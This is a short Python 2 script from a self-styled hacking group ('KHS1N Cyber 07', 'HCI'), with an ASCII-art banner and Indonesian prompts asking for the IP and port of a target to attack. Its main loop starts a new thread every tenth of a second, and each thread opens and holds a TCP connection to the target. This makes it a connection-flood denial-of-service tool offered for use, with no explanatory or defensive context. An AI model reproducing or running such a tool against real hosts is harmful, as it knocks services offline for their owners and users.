from os import *
from socket import *
from string import *
from random import *
from time import *
from thread import *

print "CopyRev 2018 by KHS1N Cyber 07"
print "\a"
print \
"""

||  ||  /:: ||
||  || ||   ||
||==|| ||   ||
||  ||  \;; ||

  
                  `.-//++++//-.`                  
             `-+ssoooooooooosoooss+-`             
          `:ssoo+++/-.`    `.-/+++ooss:`          
        `+yo+o+.                  ./oooyo.        
      `+h/oo.          `.-.          `+o+yo`      
     -h++o` `/.   .-:/:msoMd/--.   ./.  +o+h:     
    :d:y-.:yd. `-:.`:. .-om/-:`.--` .dh::`s/h+    
   :d-y./doy+ -:`  :.   -o   --  `-:`+yoho.s/h+   
  -d-h.ohyho`::---::----sh:---/:---::.+hyds-y:d:  
 `y+s-ohsss`:.    /`   `os.   `:    `/`ssshy`h/h` 
 -m.h.omsm.-:    .:.-+h`+h`os:-/`    -:`hddo-+/d: 
 /h/++/dys`:-````:NMMMd .+ +MMMM+````./ s+d:s.sso 
 +y+::N/sh :-....oMMMMM.:y dMMMMd....-/ od:N+`hos 
 /h//.ydN/.--    dMMMMMmsdyMMMMMM.   .:`/mdy:.yso 
 -m-y:y+yoo`/`  .MMMMMMMMMMMMMMMMo  `:./ho+y/+/d: 
 `y+y.+Nssh:.:--oMMMMMMMMMMMMMMMMd--:-/sdoN+ h:h` 
  -d-y`+shN:d.:--mMMMMMMMMMMMMMMM+.:.h+dho+`o/d:  
   /h:y.yys/dy:-:-oNMMMMMMMMMMMy::-/om/shy.+oy+   
    /h/y`-ydhmohs.-NMMMMMMMMMMM+.odomhhy- o+h+`   
     -h+o+.+syyydmyMMMMMMMMMMMMdmmyhhyo.:s+h/     
      `oy+o/`-osoohMMMMMMMMMMMMmsooo: :soys.      
        .oyooo:-::-oMMMMMMMMMMd.--.-+ooys.        
          `/ssso++//MMMMMMMMMMy:++ossy/`          
             `-ossssyyyyyyyyyyyssso:`             
                 ``-:+oooooo+/-.`
                                          

"""
print "HCI"
print "KHS1N Cyber 07"
print "thankz support bang Beny N HCI"
print "Hajar Hajar Hajar"

host = raw_input("IP Target yg akan di serang: ")
port = input("Nomor Port: ")



def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sleep(99)
        sock1.close
    except:
        print "Injak vrowh!!"

n = 1000000000000000000


while 1:
    try:
        start_new_thread(connect, (n,))
    except:
        print "Sambungan Gagal , Menyambung Lagi"
    print "Family HCI Attack, Fire!!!"
    sleep(0.1)
